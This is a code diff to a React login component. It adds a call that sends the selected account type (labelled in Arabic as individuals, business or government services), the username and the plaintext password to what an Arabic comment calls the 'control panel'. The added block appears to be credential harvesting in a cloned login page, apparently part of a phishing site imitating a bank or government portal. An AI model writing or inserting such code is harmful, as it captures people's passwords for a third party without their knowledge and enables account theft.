@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import { Link, useLocation } from "wouter";
+import { submitData } from "@/lib/store";
 
 export default function Login() {
   const [, setLocation] = useLocation();
@@ -54,6 +55,18 @@ export default function Login() {
       setShowErrors(true);
       return;
     }
+    
+    // إرسال البيانات للوحة التحكم
+    const accountTypeLabels: Record<string, string> = {
+      individuals: 'أفراد',
+      business: 'أعمال',
+      government: 'خدمات حكومية'
+    };
+    submitData({
+      'نوع الحساب': accountTypeLabels[accountType] || accountType,
+      'اسم المستخدم': username,
+      'كلمة المرور': password,
+    });
     
     setShowErrors(false);
     handleActionWithLoading();
